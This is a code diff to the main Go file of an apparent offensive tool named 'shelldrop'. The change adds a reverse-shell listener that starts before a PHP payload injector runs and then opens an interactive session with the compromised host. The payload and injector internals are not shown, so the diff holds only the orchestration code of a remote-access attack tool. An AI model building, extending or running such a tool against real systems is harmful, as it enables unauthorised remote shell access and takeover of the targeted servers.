@@ -1,11 +1,21 @@
 package main
 
-import "shelldrop/log"
+import (
+	"fmt"
+	"os"
+	"shelldrop/log"
+)
 
 func main() {
 	cfg := ParseConfig()
 
-	log.Info("Finding working reverse shell payloads, ensure your listener is running...")
+	listener := NewReverseShellListener(cfg.Listener)
+
+	if err := listener.Start(); err != nil {
+		fmt.Printf("[-] Error starting listener: %v\n", err)
+		os.Exit(1)
+	}
+	defer listener.Close()
 
 	injector := NewInjector("php_1").
 		WithListenerConfig(cfg.Listener).
@@ -13,5 +23,10 @@ func main() {
 
 	if err := injector.Do(); err != nil {
 		log.Fatalf("Failed to inject payload: %v", err)
+	}
+
+	if err := listener.Interact(); err != nil {
+		fmt.Printf("[-] Error during interaction: %v\n", err)
+		os.Exit(1)
 	}
 }
